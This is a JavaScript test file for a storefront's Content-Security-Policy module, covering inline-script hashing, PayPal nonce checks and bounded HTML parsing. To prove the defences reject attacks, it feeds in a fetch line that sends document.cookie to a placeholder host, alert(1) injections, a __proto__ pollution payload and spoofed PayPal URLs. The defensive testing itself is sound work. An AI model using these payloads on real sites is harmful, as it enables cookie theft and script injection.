import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile, readdir } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';
import { join } from 'node:path';
import { isDataScript, isBootstrapScript, inlineScriptHashes, scriptHash, paymentSdkUrl,
  paypalNonceHandler, secureHtml, boundedHtml, MAX_HTML_BYTES } from './storefront-csp.js';

test('configuration accepts only JSON assignments to the existing public variables', () => {
  assert.equal(isDataScript('window.SHOP_CONFIG={"features":{"paypalCheckout":true}};window.KASSE_LANG="de";'),true);
  assert.equal(isDataScript('window.ARTICLE_ITEM={"title":"Name ; window.foo = xyz","price":30};'),true);
  for(const source of [
    'window.location="https://untrusted.example";', 'window.SHOP_CONFIG={value:alert(1)};',
    'window.SHOP_CONFIG={"x":1};alert(1)', 'window.SHOP_CONFIG=JSON.parse("{}");',
    'window.SHOP_CONFIG={"__proto__":{"x":1}};', 'window.SHOP_CONFIG={"x":{"constructor":{}}};',
    'window.SHOP_CONFIG={"x":"broken};', 'window.SHOP_CONFIG={};/*unexpected code*/',
  ])assert.equal(isDataScript(source),false,source);
});

test('unknown inline scripts are not blessed while existing product data works', async () => {
  const good='window.ARTICLE_ITEM={"id":181,"title":"Test"};window.ARTICLE_LANG="de";';
  const bad='fetch("https://untrusted.example",{body:document.cookie})';
  const hashes=await inlineScriptHashes(`<script>${good}</script><script>${bad}</script>`);
  assert.deepEqual(hashes,[await scriptHash(good)]);
  assert.ok(!hashes.includes(await scriptHash(bad)));
});

test('Paypal nonce is applied only to the parsed SDK source attribute', () => {
  for(const src of ['https://www.paypal.com/sdk/js?client-id=test','https://www.sandbox.paypal.com/sdk/js?client-id=test'])assert.equal(paymentSdkUrl(src),true);
  for(const src of ['https://paypal.com.untrusted.example/sdk/js','http://www.paypal.com/sdk/js','https://user@www.paypal.com/sdk/js','https://www.paypal.com:444/sdk/js','https://www.paypal.com/other.js','javascript:alert(1)'])assert.equal(paymentSdkUrl(src),false);
  const elements=[{'src':'https://www.paypal.com/sdk/js?client-id=test'},
    {'src':'https://untrusted.example/x.js','data-note':'src="https://www.paypal.com/sdk/js"'}];
  for(const attrs of elements)paypalNonceHandler('fresh-random-nonce').element({getAttribute:k=>attrs[k],setAttribute:(k,v)=>{attrs[k]=v;}});
  assert.equal(elements[0]['data-csp-nonce'],'fresh-random-nonce');
  assert.equal(elements[0].nonce,'fresh-random-nonce');
  assert.equal(elements[1].nonce,undefined);
});

test('blocking CSP authorizes hashes and payment SDKs, never blanket inline code', async () => {
  const text='<html><script>window.SHOP_CONFIG={};</script></html>';
  const headers=new Headers({'Content-Type':'text/html','ETag':'old','Content-Encoding':'gzip','Content-Length':'999'});
  const a=await secureHtml(new Response(text),new Headers(headers));
  const b=await secureHtml(new Response(text),new Headers(headers));
  const policy=a.headers.get('Content-Security-Policy');
  const directive=policy.split(';').map(x=>x.trim()).find(x=>x.startsWith('script-src '));
  assert.match(directive,new RegExp((await scriptHash('window.SHOP_CONFIG={};')).replace(/[.*+?^${}()|[\]\\]/g,'\\$&')));
  assert.match(directive,/nonce-/);assert.doesNotMatch(directive,/unsafe-inline|unsafe-eval/);
  assert.match(policy,/script-src-attr 'unsafe-hashes'/);
  assert.match(policy,/paypal/);assert.match(policy,/base-uri 'none'/);
  assert.notEqual(policy,b.headers.get('Content-Security-Policy'));
  assert.equal(a.headers.get('Cache-Control'),'no-store');
  for(const name of ['ETag','Content-Length','Content-Encoding','Content-Security-Policy-Report-Only'])assert.equal(a.headers.get(name),null);
  assert.equal(await a.text(),text);
});

test('oversized HTML fails before it can allocate an unbounded hash list', async () => {
  await assert.rejects(()=>boundedHtml(new Response('x'.repeat(MAX_HTML_BYTES+1))),/HTML_TOO_LARGE/);
});

test('many malformed script start tags cannot become an unbounded backtracking task', {timeout:1000}, async()=>{
  assert.deepEqual(await inlineScriptHashes('<script '.repeat(50000)),[]);
});

test('all published HTML bootstraps are covered without authorizing executable injections', async () => {
  const root=fileURLToPath(new URL('../',import.meta.url));
  const files=[];
  async function walk(dir) {
    for(const entry of await readdir(dir,{withFileTypes:true})) {
      if(['.git','node_modules','shop-worker','scripts','docs','tools','config','assets','data'].includes(entry.name))continue;
      const p=join(dir,entry.name);
      if(entry.isDirectory())await walk(p);
      else if(entry.name.endsWith('.html')&&!entry.name.endsWith('_template.html'))files.push(p);
    }
  }
  await walk(root);
  let scripts=0;
  for(const path of files) {
    const html=await readFile(path,'utf8');const approved=await inlineScriptHashes(html);
    for(const match of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script\s*>/gi)) {
      if(/\bsrc\s*=/i.test(match[1])||/application\//i.test(match[1]))continue;
      assert.ok(approved.includes(await scriptHash(match[2])),`Uncovered inline bootstrap: ${path}`);scripts++;
      if(match[2].startsWith('/* FOCUS3_')) {
        assert.equal(isBootstrapScript(match[2]),true);
        assert.equal(isBootstrapScript(match[2].replace('/assets/app.js','https://untrusted.example/app.js')),false);
      }
    }
  }
  assert.ok(scripts>10);
});
